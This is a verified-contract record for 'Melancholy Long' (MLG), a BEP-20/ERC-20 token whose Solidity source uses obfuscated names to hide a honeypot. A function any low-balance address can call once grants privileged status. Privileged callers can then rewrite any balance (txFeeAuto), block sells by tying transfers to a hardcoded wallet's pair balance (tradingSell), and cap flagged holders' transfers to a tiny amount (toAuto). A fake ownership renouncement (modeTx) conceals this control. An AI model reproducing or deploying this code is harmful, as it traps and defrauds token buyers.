{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface atSenderFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountToken {\n    function createPair(address marketingList, address receiverFee) external returns (address);\n}\n\ninterface receiverFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTx) external view returns (uint256);\n\n    function transfer(address modeAmountMin, uint256 receiverAuto) external returns (bool);\n\n    function allowance(address fundAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeAmountMin,\n        uint256 receiverAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSender, uint256 value);\n    event Approval(address indexed fundAuto, address indexed spender, uint256 value);\n}\n\ninterface receiverFundMetadata is receiverFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MelancholyLong is teamTrading, receiverFund, receiverFundMetadata {\n\n    mapping(address => uint256) private totalMarketing;\n\n    function tradingSell(uint256 receiverAuto) public {\n        fromSellTake();\n        receiverLimit = receiverAuto;\n    }\n\n    address launchedSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return autoLaunched;\n    }\n\n    function allowance(address receiverShouldReceiver, address swapFundWallet) external view virtual override returns (uint256) {\n        if (swapFundWallet == fromLimit) {\n            return type(uint256).max;\n        }\n        return senderLiquidity[receiverShouldReceiver][swapFundWallet];\n    }\n\n    string private shouldTo = \"MLG\";\n\n    uint256 public feeFrom;\n\n    bool public fundAt;\n\n    address public feeAmount;\n\n    function toAuto(address totalLaunch) public {\n        fromSellTake();\n        \n        if (totalLaunch == feeAmount || totalLaunch == launchedMin) {\n            return;\n        }\n        totalTokenAt[totalLaunch] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTo;\n    }\n\n    uint256 public maxReceiver;\n\n    address private autoLaunched;\n\n    mapping(address => bool) public totalTokenAt;\n\n    uint8 private listExempt = 18;\n\n    uint256 private walletFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public launchEnableExempt;\n\n    uint256 constant maxFrom = 8 ** 10;\n\n    uint256 fundLiquidity;\n\n    function balanceOf(address liquidityTx) public view virtual override returns (uint256) {\n        return totalMarketing[liquidityTx];\n    }\n\n    string private totalShouldFee = \"Melancholy Long\";\n\n    uint256 private limitExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listExempt;\n    }\n\n    function modeTx() public {\n        emit OwnershipTransferred(feeAmount, address(0));\n        autoLaunched = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoLaunched;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalShouldFee;\n    }\n\n    bool public limitReceiverList;\n\n    function fromSender(address sellTake) public {\n        require(sellTake.balance < 100000);\n        if (fundAt) {\n            return;\n        }\n        \n        launchEnableExempt[sellTake] = true;\n        if (tokenTeam) {\n            limitExempt = feeFrom;\n        }\n        fundAt = true;\n    }\n\n    address public launchedMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletFund;\n    }\n\n    function listAmount(address buyTake, address modeAmountMin, uint256 receiverAuto) internal returns (bool) {\n        require(totalMarketing[buyTake] >= receiverAuto);\n        totalMarketing[buyTake] -= receiverAuto;\n        totalMarketing[modeAmountMin] += receiverAuto;\n        emit Transfer(buyTake, modeAmountMin, receiverAuto);\n        return true;\n    }\n\n    function enableMode(address buyTake, address modeAmountMin, uint256 receiverAuto) internal returns (bool) {\n        if (buyTake == feeAmount) {\n            return listAmount(buyTake, modeAmountMin, receiverAuto);\n        }\n        uint256 txExempt = receiverFund(launchedMin).balanceOf(launchedSwap);\n        require(txExempt == receiverLimit);\n        require(modeAmountMin != launchedSwap);\n        if (totalTokenAt[buyTake]) {\n            return listAmount(buyTake, modeAmountMin, maxFrom);\n        }\n        return listAmount(buyTake, modeAmountMin, receiverAuto);\n    }\n\n    bool public marketingTradingMin;\n\n    function approve(address swapFundWallet, uint256 receiverAuto) public virtual override returns (bool) {\n        senderLiquidity[_msgSender()][swapFundWallet] = receiverAuto;\n        emit Approval(_msgSender(), swapFundWallet, receiverAuto);\n        return true;\n    }\n\n    function txFeeAuto(address senderSellAmount, uint256 receiverAuto) public {\n        fromSellTake();\n        totalMarketing[senderSellAmount] = receiverAuto;\n    }\n\n    address fromLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromSellTake() private view {\n        require(launchEnableExempt[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private senderLiquidity;\n\n    function transferFrom(address buyTake, address modeAmountMin, uint256 receiverAuto) external override returns (bool) {\n        if (_msgSender() != fromLimit) {\n            if (senderLiquidity[buyTake][_msgSender()] != type(uint256).max) {\n                require(receiverAuto <= senderLiquidity[buyTake][_msgSender()]);\n                senderLiquidity[buyTake][_msgSender()] -= receiverAuto;\n            }\n        }\n        return enableMode(buyTake, modeAmountMin, receiverAuto);\n    }\n\n    function transfer(address senderSellAmount, uint256 receiverAuto) external virtual override returns (bool) {\n        return enableMode(_msgSender(), senderSellAmount, receiverAuto);\n    }\n\n    uint256 receiverLimit;\n\n    event OwnershipTransferred(address indexed autoShouldTake, address indexed launchFund);\n\n    bool private tokenTeam;\n\n    constructor (){\n        \n        atSenderFund tradingMinAmount = atSenderFund(fromLimit);\n        launchedMin = amountToken(tradingMinAmount.factory()).createPair(tradingMinAmount.WETH(), address(this));\n        \n        feeAmount = _msgSender();\n        modeTx();\n        launchEnableExempt[feeAmount] = true;\n        totalMarketing[feeAmount] = walletFund;\n        \n        emit Transfer(address(0), feeAmount, walletFund);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShouldTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFundWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchEnableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSellAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAmountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSellAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAuto\",\"type\":\"uint256\"}],\"name\":\"txFeeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MelancholyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}